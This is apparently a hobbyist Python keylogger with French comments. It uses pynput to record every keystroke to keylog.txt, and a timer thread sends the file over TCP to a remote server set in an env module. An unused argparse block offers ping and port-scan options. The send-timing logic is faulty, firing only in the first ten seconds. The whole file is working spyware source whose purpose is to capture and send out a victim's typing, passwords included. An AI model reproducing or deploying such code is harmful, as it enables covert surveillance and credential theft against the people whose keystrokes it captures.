from env import *

import argparse
import socket
import time
import threading
from pynput.keyboard import Key, Listener

def argument():
    p = argparse.ArgumentParser(description='Ajouter description')
    p.add_argument('-p', '--ping', action='store_true', help='Fais un scan via Ping, pour voir les machines UP')
    p.add_argument('-s', '--socket',type=all, help="Recherche si le port spécifié est UP, mettre autre chose qu'un INT pour faire sur les 100 premiers ports")
    p.add_argument('-o', action='store_true', help='Enregistre les resultats dans un fichier')
    args = p.parse_args()
    return args



TXT_GLOB = ""


####connection avec le serveur

## Thread 1
# activation du script
# Lancement d'une requette au srv

# toutes les X frappes de clavier - Refresh renvoi au srv

##Thread 2
# Ecouter serveur

def kpr(key):
        global TXT_GLOB
        with open("keylog.txt", "a") as f:
            f.write(f"{key} ")
            TXT_GLOB += str(key)



def chrono():
    while True:
        seconds = 0
        while True:
            print(f"Secondes : {seconds}")
            seconds += 1
            time.sleep(1)
            if seconds == seconds % 10 :
                send_t = threading.Thread(target=send)
                send_t.start()
def keylogger():
    with Listener(on_press=kpr) as listener:
        listener.join()


def send():

    global TXT_GLOB
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client_socket.connect((SRV, PORT))


    #client_socket.send(message.encode('utf-8')) ##envoi
    keylog_fichier = "keylog.txt"

    client_socket.send( keylog_fichier.encode('utf-8'))  # envoie fichier


    with open("keylog.txt", "r") as f:
        with open(keylog_fichier, 'rb') as file:
            while True:
                data = file.read(1024)
                if not data:
                    break
                client_socket.send(data)

        response = client_socket.recv(1024) ### 124 taille du message en octet
        print(f"Réponse du serveur : {response.decode('utf-8')}")

        client_socket.close()

        print(f"Le fichier '{keylog_fichier}' a été envoyé avec succès.")

    # Fermez la connexion
    client_socket.close()


chrono_t = threading.Thread(target=chrono)

chrono_t.start()


keylog_t = threading.Thread(target=keylogger)

keylog_t.start()










